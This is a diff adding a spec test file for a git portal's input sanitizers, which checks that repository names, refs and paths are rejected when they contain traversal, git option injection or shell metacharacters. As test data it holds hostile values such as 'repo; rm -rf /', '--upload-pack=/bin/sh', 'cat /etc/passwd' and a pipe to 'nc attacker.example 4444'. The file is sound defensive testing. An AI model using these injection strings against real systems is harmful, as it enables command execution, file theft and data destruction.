@@ -1,0 +1,70 @@
+use std.spec
+use app.portal.git_repo.{sanitize_repo_name, sanitize_ref, sanitize_path}
+
+fn _rejects_repo_name(raw: text) -> bool:
+    match sanitize_repo_name(raw):
+        Err(_): true
+        Ok(_): false
+
+fn _rejects_ref(raw: text) -> bool:
+    match sanitize_ref(raw):
+        Err(_): true
+        Ok(_): false
+
+fn _rejects_path(raw: text) -> bool:
+    match sanitize_path(raw):
+        Err(_): true
+        Ok(_): false
+
+describe "portal git input sanitization":
+    it "accepts a normal repository name":
+        expect(_rejects_repo_name("simple")).to_equal(false)
+
+    it "rejects a repository name with parent-directory traversal":
+        expect(_rejects_repo_name("../../etc")).to_equal(true)
+
+    it "rejects a repository name that looks like an option":
+        expect(_rejects_repo_name("--upload-pack=/bin/sh")).to_equal(true)
+
+    it "rejects a repository name with a path separator":
+        expect(_rejects_repo_name("a/b")).to_equal(true)
+
+    it "rejects a repository name with shell metacharacters":
+        expect(_rejects_repo_name("repo; rm -rf /")).to_equal(true)
+        expect(_rejects_repo_name("repo$(whoami)")).to_equal(true)
+        expect(_rejects_repo_name("repo`id`")).to_equal(true)
+
+    it "accepts a normal branch ref":
+        expect(_rejects_ref("main")).to_equal(false)
+        expect(_rejects_ref("release-1.0")).to_equal(false)
+
+    it "rejects a ref with parent-directory traversal":
+        expect(_rejects_ref("../HEAD")).to_equal(true)
+
+    it "rejects a ref that looks like a git option":
+        expect(_rejects_ref("--output=/etc/passwd")).to_equal(true)
+
+    it "rejects a ref with a colon (tree-ish injection)":
+        expect(_rejects_ref("main:secret")).to_equal(true)
+
+    it "rejects an empty ref":
+        expect(_rejects_ref("")).to_equal(true)
+
+    it "accepts a normal nested file path":
+        expect(_rejects_path("src/app/main.spl")).to_equal(false)
+
+    it "accepts an empty path (repository root)":
+        expect(_rejects_path("")).to_equal(false)
+
+    it "rejects a path with parent-directory traversal":
+        expect(_rejects_path("../../../etc/passwd")).to_equal(true)
+
+    it "rejects an absolute path":
+        expect(_rejects_path("/etc/passwd")).to_equal(true)
+
+    it "rejects a path that looks like a git option":
+        expect(_rejects_path("--output=owned")).to_equal(true)
+
+    it "rejects a path with shell metacharacters":
+        expect(_rejects_path("file.txt; cat /etc/passwd")).to_equal(true)
+        expect(_rejects_path("file|nc attacker.example 4444")).to_equal(true)
